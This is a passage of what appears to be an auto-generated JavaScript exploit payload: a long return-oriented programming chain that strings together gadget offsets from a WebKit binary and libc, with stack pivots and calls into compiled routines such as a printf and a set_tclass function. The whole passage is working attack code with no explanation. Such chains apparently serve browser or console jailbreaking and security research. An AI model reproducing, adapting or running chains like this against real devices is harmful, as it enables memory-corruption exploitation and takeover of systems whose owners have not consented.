set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L6097:
db([41,0]);// 0x29
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+328912,//L6100
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6098:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L6100:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+329000,//L6102
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+329016,//L6103
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6102:
db([0,0]);
set_gadget(libc_base+772328,);
//L6103:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+329160,//L6106
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+329176,//L6107
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+329144,//L6105
webkit_base+4687784,
libc_base+713278
]);
//L6104:
db([16,0]);// 0x10
set_gadget(libc_base+165442,);
//L6105:
db([0,0]);
set_gadget(libc_base+772328,);
//L6106:
db([0,0]);
set_gadget(libc_base+768796,);
//L6107:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+329264,//L6109
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+329280,//L6110
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6109:
db([0,0]);
set_gadget(libc_base+772328,);
//L6110:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+329440,//L6112
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+329472,//L6114
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+329424,//L6111
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+329456,//L6113
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6111:
db([0,0]);
set_gadget(libc_base+165442,);
//L6112:
db([0,0]);
set_gadget(libc_base+772328,);
//L6113:
db([0,0]);
set_gadget(libc_base+768796,);
//L6114:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+329568,//L6116
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+329552,//L6115
webkit_base+4687784,
libc_base+165442
]);
//L6115:
db([0,0]);
set_gadget(libc_base+768796,);
//L6116:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L6118:
ropchain+329672,//L6117
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+336600,//L5744
//L6117:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967256,4294967295]);// -0x28
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+329816,//L6120
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+329832,//L6121
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+329800,//L6119
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6119:
db([0,0]);
set_gadget(libc_base+165442,);
//L6120:
db([0,0]);
set_gadget(libc_base+768796,);
//L6121:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+329960,//L6124
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+329992,//L6126
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+329976,//L6125
webkit_base+4687784,
libc_base+713278
]);
//L6123:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L6124:
db([0,0]);
set_gadget(libc_base+165442,);
//L6125:
db([0,0]);
set_gadget(libc_base+768796,);
//L6126:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+330104,//L6127+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+330096,//L6127
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L6127:
db([0,0]);
set_gadgets([
ropchain+330120,//L6127+24
ropchain+330584,//L6122
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+330192,//L6130
webkit_base+4687784,
libc_base+768796
]);
//L6128:
db([0,0]);
set_gadget(libc_base+165442,);
//L6129:
db([0,0]);
set_gadget(libc_base+772328,);
//L6130:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+330352,//L6132
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+330384,//L6134
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+330336,//L6131
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+330368,//L6133
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6131:
db([0,0]);
set_gadget(libc_base+165442,);
//L6132:
db([0,0]);
set_gadget(libc_base+772328,);
//L6133:
db([0,0]);
set_gadget(libc_base+768796,);
//L6134:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+330464,//L6135
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+330480,//L6136
webkit_base+4687784,
libc_base+165442
]);
//L6135:
db([0,0]);
set_gadget(libc_base+768796,);
//L6136:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+330576,//L6138
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+330560,//L6137
webkit_base+4687784,
libc_base+165442
]);
//L6137:
db([0,0]);
set_gadget(libc_base+768796,);
//L6138:
db([0,0]);
//L6122:
set_gadgets([
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6139:
db([4294965196,4294967295]);// -0x834
set_gadget(libc_base+772328,);
//L6141:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+330680,//L6143
webkit_base+4687784,
libc_base+772328
]);
//L6142:
db([0,0]);
set_gadget(libc_base+768796,);
//L6143:
db([0,0]);
set_gadgets([
webkit_base+972324,//mov [rax],ecx
libc_base+713278,
ropchain+330736,//L6146
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6146:
db([0,0]);
//L6144:
set_gadgets([
libc_base+713278,
ropchain+330800,//L6149
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6147:
db([4294965196,4294967295]);// -0x834
set_gadget(libc_base+772328,);
//L6149:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+330888,//L6151
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+330904,//L6152
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6151:
db([0,0]);
set_gadget(libc_base+772328,);
//L6152:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+331064,//L6154
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+331096,//L6156
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+331048,//L6153
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+331080,//L6155
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6153:
db([0,0]);
set_gadget(libc_base+165442,);
//L6154:
db([0,0]);
set_gadget(libc_base+772328,);
//L6155:
db([0,0]);
set_gadget(libc_base+768796,);
//L6156:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+331176,//L6157
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+331192,//L6158
webkit_base+4687784,
libc_base+165442
]);
//L6157:
db([0,0]);
set_gadget(libc_base+768796,);
//L6158:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+331288,//L6160
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+331272,//L6159
webkit_base+4687784,
libc_base+165442
]);
//L6159:
db([0,0]);
set_gadget(libc_base+768796,);
//L6160:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+331384,//L6162
webkit_base+4687784,
libc_base+768796
]);
//L6161:
db([512,0]);// 0x200
set_gadget(webkit_base+3789839,);//pop r11
//L6162:
db([0,0]);
set_gadget(libc_base+165442,);
//L6163:
db([512,0]);// 0x200
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+331528,//L6165
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+331544,//L6166
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+331512,//L6164
webkit_base+4687784,
libc_base+165442
]);
//L6164:
db([0,0]);
set_gadget(libc_base+772328,);
//L6165:
db([0,0]);
set_gadget(libc_base+768796,);
//L6166:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+15055763,//cmp rax,rcx ;sete al
webkit_base+47019,//setl al
libc_base+232261,//movzx eax,al
libc_base+713278,
ropchain+331720,//L6168
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+331736,//L6169
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+331704,//L6167
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6167:
db([0,0]);
set_gadget(libc_base+165442,);
//L6168:
db([0,0]);
set_gadget(libc_base+768796,);
//L6169:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+331864,//L6172
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+331896,//L6174
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+331880,//L6173
webkit_base+4687784,
libc_base+713278
]);
//L6171:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L6172:
db([0,0]);
set_gadget(libc_base+165442,);
//L6173:
db([0,0]);
set_gadget(libc_base+768796,);
//L6174:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+332008,//L6175+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+332000,//L6175
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L6175:
db([0,0]);
set_gadgets([
ropchain+332024,//L6175+24
ropchain+332040,//L6170
libc_base+489696,//pop rsp
ropchain+332056,//L6176
//L6170:
libc_base+489696,//pop rsp
ropchain+335000,//L6177
//L6176:
libc_base+768796
]);
//L6178:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+332160,//L6181
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6179:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L6181:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+332248,//L6183
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+332264,//L6184
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6183:
db([0,0]);
set_gadget(libc_base+772328,);
//L6184:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+332408,//L6187
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+332424,//L6188
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+332392,//L6186
webkit_base+4687784,
libc_base+713278
]);
//L6185:
db([24,0]);// 0x18
set_gadget(libc_base+165442,);
//L6186:
db([0,0]);
set_gadget(libc_base+772328,);
//L6187:
db([0,0]);
set_gadget(libc_base+768796,);
//L6188:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+332512,//L6190
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+332528,//L6191
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6190:
db([0,0]);
set_gadget(libc_base+772328,);
//L6191:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+332672,//L6194
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+332640,//L6192
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+332656,//L6193
webkit_base+4687784,
libc_base+165442
]);
//L6192:
db([0,0]);
set_gadget(libc_base+772328,);
//L6193:
db([0,0]);
set_gadget(libc_base+768796,);
//L6194:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+332744,//L6196
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6196:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+332800,//L6198
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6198:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+332896,//L6201
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6199:
db([4294965196,4294967295]);// -0x834
set_gadget(libc_base+772328,);
//L6201:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+332984,//L6203
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+333000,//L6204
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6203:
db([0,0]);
set_gadget(libc_base+772328,);
//L6204:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+333160,//L6206
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+333192,//L6208
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+333144,//L6205
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+333176,//L6207
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6205:
db([0,0]);
set_gadget(libc_base+165442,);
//L6206:
db([0,0]);
set_gadget(libc_base+772328,);
//L6207:
db([0,0]);
set_gadget(libc_base+768796,);
//L6208:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+333352,//L6212
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+333304,//L6209
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+333320,//L6210
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6209:
db([0,0]);
set_gadget(libc_base+165442,);
//L6210:
db([0,0]);
set_gadget(libc_base+772328,);
//L6211:
db([4,0]);// 0x4
set_gadget(libc_base+768796,);
//L6212:
db([0,0]);
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+333432,//L6213
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+333448,//L6214
webkit_base+4687784,
libc_base+772328
]);
//L6213:
db([0,0]);
set_gadget(libc_base+768796,);
//L6214:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+333536,//L6216
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6216:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+333592,//L6218
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6218:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+333720,//L6219
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+333752,//L6221
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+333736,//L6220
webkit_base+4687784,
libc_base+165442
]);
//L6219:
db([0,0]);
set_gadget(libc_base+772328,);
//L6220:
db([0,0]);
set_gadget(libc_base+768796,);
//L6221:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+333912,//L6223
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+333944,//L6225
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+333896,//L6222
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+333928,//L6224
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6222:
db([0,0]);
set_gadget(libc_base+165442,);
//L6223:
db([0,0]);
set_gadget(libc_base+772328,);
//L6224:
db([0,0]);
set_gadget(libc_base+768796,);
//L6225:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+334024,//L6226
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+334040,//L6227
webkit_base+4687784,
libc_base+165442
]);
//L6226:
db([0,0]);
set_gadget(libc_base+768796,);
//L6227:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+334136,//L6229
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+334120,//L6228
webkit_base+4687784,
libc_base+165442
]);
//L6228:
db([0,0]);
set_gadget(libc_base+768796,);
//L6229:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L6231:
ropchain+334240,//L6230
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+187456,//_set_tclass
//L6230:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
//L6232:
libc_base+713278,
ropchain+334328,//L6235
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6233:
db([4294965196,4294967295]);// -0x834
set_gadget(libc_base+772328,);
//L6235:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+334416,//L6237
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+334432,//L6238
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6237:
db([0,0]);
set_gadget(libc_base+772328,);
//L6238:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+334592,//L6240
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+334624,//L6242
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+334576,//L6239
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+334608,//L6241
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6239:
db([0,0]);
set_gadget(libc_base+165442,);
//L6240:
db([0,0]);
set_gadget(libc_base+772328,);
//L6241:
db([0,0]);
set_gadget(libc_base+768796,);
//L6242:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+334720,//L6244
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+334704,//L6243
webkit_base+4687784,
libc_base+165442
]);
//L6243:
db([0,0]);
set_gadget(libc_base+768796,);
//L6244:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+334808,//L6246
webkit_base+4687784,
libc_base+713278
]);
//L6245:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L6246:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+334880,//L6249
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6247:
db([4294965196,4294967295]);// -0x834
set_gadget(libc_base+772328,);
//L6249:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+713278,
ropchain+334944,//L6251
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6251:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+489696,//pop rsp
ropchain+330744,//L6144
//L6177:
libc_base+713278,
ropchain+335056,//L6254
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6252:
db([32,0]);// 0x20
set_gadget(libc_base+772328,);
//L6254:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+335144,//L6256
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+335160,//L6257
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6256:
db([0,0]);
set_gadget(libc_base+772328,);
//L6257:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+335304,//L6260
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+335272,//L6258
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+335288,//L6259
webkit_base+4687784,
libc_base+165442
]);
//L6258:
db([0,0]);
set_gadget(libc_base+772328,);
//L6259:
db([0,0]);
set_gadget(libc_base+768796,);
//L6260:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+335376,//L6262
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6262:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+335432,//L6264
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6264:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+335528,//L6266
webkit_base+4687784,
libc_base+768796
]);
//L6265:
db([1,0]);// 0x1
set_gadget(webkit_base+3789839,);//pop r11
//L6266:
db([0,0]);
set_gadget(libc_base+772328,);
//L6267:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+335624,//L6268
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+335640,//L6269
webkit_base+4687784,
libc_base+772328
]);
//L6268:
db([0,0]);
set_gadget(libc_base+768796,);
//L6269:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+335728,//L6271
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6271:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+335784,//L6273
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6273:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+335912,//L6274
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+335944,//L6276
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+335928,//L6275
webkit_base+4687784,
libc_base+165442
]);
//L6274:
db([0,0]);
set_gadget(libc_base+772328,);
//L6275:
db([0,0]);
set_gadget(libc_base+768796,);
//L6276:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+336088,//L6279
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+336056,//L6277
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+336072,//L6278
webkit_base+4687784,
libc_base+165442
]);
//L6277:
db([0,0]);
set_gadget(libc_base+772328,);
//L6278:
db([0,0]);
set_gadget(libc_base+768796,);
//L6279:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L6281:
ropchain+603896,//L6280
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L6283:
ropchain+336240,//L6282
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+161664,//_printf_
//L6282:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+336352,//L6285
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+336336,//L6284
webkit_base+4687784,
libc_base+165442
]);
//L6284:
db([0,0]);
set_gadget(libc_base+768796,);
//L6285:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+336456,//L6286
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+336472,//L6287
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L6286:
db([0,0]);
set_gadget(libc_base+768796,);
//L6287:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+336592,//L6288
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+336576,//L6289
webkit_base+4687784,
libc_base+768796
]);
//L6289:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L6288:
db([0,0]);
//L5744:
set_gadget(libc_base+713278,);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+608613,//pop rdx
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+17972187,//pop r9
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+765305,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
webkit_base+4687784,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+489696,//pop rsp
libc_base+430587,
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967080,4294967295]);// -0xd8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([200,0]);// 0xc8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967088,4294967295]);// -0xd0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
